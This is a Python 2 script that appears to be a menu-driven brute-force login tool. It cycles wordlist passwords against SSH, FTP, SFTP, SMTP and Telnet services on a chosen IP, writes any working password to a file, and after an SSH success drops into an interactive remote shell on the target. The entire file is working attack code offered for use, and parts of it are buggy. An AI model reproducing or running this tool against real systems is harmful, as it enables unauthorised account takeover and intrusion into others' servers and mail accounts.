#imports

import pxssh
import telnetlib
import time
import smtplib
import ftplib
import os

#Main Vars

password_output = "/root/Desktop/password_output"
password_output = open(password_output, "a", 0)
s = pxssh.pxssh()

#SSH_Connect

def ssh_connect(s, IP, username, password, password_output):
    print("Connect to target ?\n")
    print("Be careful ! Still Buggy")
    wahl_connect = raw_input("Y/N: ")
    if wahl_connect == "y" or wahl_connect == "Y" :
        ssh_connect_shell(s, IP, username, password)
    elif wahl_connect == "n" or wahl_connect == "N":
        main(s)
    else:
        print("Correct this answer")
        ssh_connect(s, IP, username, password, password_output)
    main(s)
    return
#SSH_Shell

def ssh_connect_shell(s, IP, username, password):
    s = pxssh.pxssh()
    print("Connecting...")
    s.login (IP, username, password)
    while 1:
        try:
            command = raw_input("#" + IP + "> ")
            s.sendline(command)
            s.prompt()
            print(s.before)
        except:
            if command == "exit":
                main(s)
            else:
                print("Error ! An program has been slayn !")
                main(s)
    return


#Bruting
    
    
def ssh_brute(s, password_output):
    
    #Vars
    IP = raw_input("IP: ")
    username = raw_input("User: ")
    passwordfile =  "/usr/share/wordlists/ssh_wordlist"
    passwordfile = open(passwordfile, "r")
    
    #Main_Brute
    for password in passwordfile:
        try: 
            s = pxssh.pxssh()                                                           
            s.login (IP, username, password)
            print("Login with: %s") % password
            password_output.write("ssh_brute output: %s" % password)
            password_output.close()
            s.logout()
            print("7 Seconds left")
            time.sleep(7)
            print("\n" * 80)
            ssh_connect(s, IP, username, password, password_output)    
        except pxssh.ExceptionPxssh:
            print("False_Login with: %s") % password
    print("End of Wordlist")
    time.sleep(3)
    print("\n" * 80)
    main(s)
    return


def ftp_brute(password_output):
    
    #Vars
    IP = raw_input("IP: ")
    USER = raw_input("User: ")
    passwordfile = "/usr/share/wordlists/ftp_wordlist"
    passwordfile = open(passwordfile, "r")
    
    #Main_Brute
    for password in passwordfile:
        try:
            ftplib.FTP(IP, USER, password, 10)
            print("Login with: %s" % password)
            password_output.write("ftp_brute output = %s") % password
            password_output.close()
            print("7 Seconds left")
            time.sleep(7)
            print("\n" * 80)
            main(s)
        except:
            print("False_Login with: %s" % password)
    print("End of Wordlist")
    time.sleep(3)
    print("\n" * 80)
    main(s)
    return


def sftp_brute(password_output):

    #Vars
    IP = raw_input('IP: ')
    username = raw_input('User: ')
    passwordfile = "/usr/share/wordlists/sftp_wordlist"
    passwordfile = open(passwordfile, "r")

    #Main_Brute
    for password in passwordfile:
        try:                                                            
            s = pxssh.pxssh()
            s.login (IP, username, password)
            print("Login with: %s" % password)
            password_output.write("sftp_brute output = %s") % password
            password_output.close()
            s.logout()
            print("7 Seconds left")
            time.sleep(7)
            print("\n" * 80)
            main(s)    
        except pxssh.ExceptionPxssh:
            print("False_Login with: %s" % password)
    print("End of Wordlist")
    time.sleep(3)
    print("\n" * 80)
    main(s)
    return


def smtp_brute(password_output):

    #Vars
    print("A BIT BUGGY ! \n")
    IP = raw_input("IP: ")
    print("securesmtp: 587")
    print("smtp: 25 \n")
    PORT = raw_input("PORT: ")
    mail = raw_input("EMAIL: ")
    smtpserver = smtplib.SMTP(IP, PORT)
    smtpserver.ehlo()
    smtpserver.starttls()
    passwordfile = "/usr/share/wordlists/smtp_wordlist"
    passwordfile = open(passwordfile, "r")

    #Main_Brute
    for password in passwordfile:
            try:
                    smtpserver.login(mail, password)
                    print("Login with: %s" % password)
                    password_output.write("smtp_brute output = %s") % password
                    password_output.close()
                    print("7 Seconds left")
                    time.sleep(7)
                    print("\n" * 80)
                    main(s)
            except smtplib.SMTPAuthenticationError:
                    print("False_Login with: %s" % password)
    main(s)                
    return


def telnet_brute(password_output):

    #Vars
    IP = raw_input("IP: ")
    user = raw_input("User: ")
    passwordfile = "/usr/share/wordlists/telnet_wordlist"
    passwordfile = open(passwordfile, "r")

    #Main_Brute
    def telnet_login(password_output):
        for password in passwordfile:
            try:
                target = telnetlib.Telnet(IP)
                time.sleep(3)
                target.write(user + "\n")
                time.sleep(3)
                target.write(password + "\n")
                time.sleep(3)
                if target.read_until(user + "@"):
                    print("Login with: %s" % password)
                    password_output.write("telnet_brute output = %s") % password
                    password_output.close()
                    target.close()
                    print("7 Seconds left")
                    time.sleep(7)
                    print("\n" * 80)
                    target.close()
                    main(s)
                else:
                    target.close()
                    print("Wrong_Login with: %s" % password)
                    telnet_login()
                telnet_login()
            except:
                    print("ERROR")
                    target.close()
                    print("\n")
                    main(s)       
    telnet_login()
    print("End of Wordlist")
    time.sleep(3)
    print("\n" * 80)
    main(s)
    return


def show_passwordfile(password_output):
    #Vars

    #Main
    password_output = "/root/Desktop/password_output"
    password_output = open(password_output, 'r')
    print(password_output)
    os.popen("cat", password_output)
    print("[+] Return")
    return

#Whats your choice ?

def main(s):
    try:
        print("\n" * 80)
        print("PORT-SCAN FIRST \n")
        print("WORDLISTS: \n")
        print("/usr/share/wordlists/ \n")
        print("Syntax:  type_wordlist \n")
        print("1|SSH")
        print("2|FTP")
        print("3|SFTP")
        print("4|SMTP")
        print("5|TELNET")
        print("6|SHOW PASSWORDS")
        print("99|EXIT")
        print("")
        
        while 1:
            wahl = raw_input("Your choise: ")
            if wahl=="1":
                print("\n" * 80)
                print("Start SSH Brute")
                ssh_brute(s, password_output)
            elif wahl=="2":
                print("\n" * 80)
                print("Start FTP Brute")
                ftp_brute(password_output)
            elif wahl=="3":
                print("\n" * 80)
                print("Start SFTP Brute")
                sftp_brute(password_output)
            elif wahl=="4":
                print("\n" * 80)
                print("Start SMTP Brute")
                smtp_brute(password_output)
                
            elif wahl=="5":
                print("\n" * 80)
                print("Start TELNET Brute")
                telnet_brute(password_output)
            elif wahl=="6":
                print("SHOW PASSWORDFILE")
                show_passwordfile(password_output)
            elif wahl=="99":
                quit(1)
            else:
                print("\n" * 80)
                print("Make a better choise")
                time.sleep(1)
                main(s)
        return
    except KeyboardInterrupt:
        print("[-] EXIT")

#Main-Program-Start
main(s)


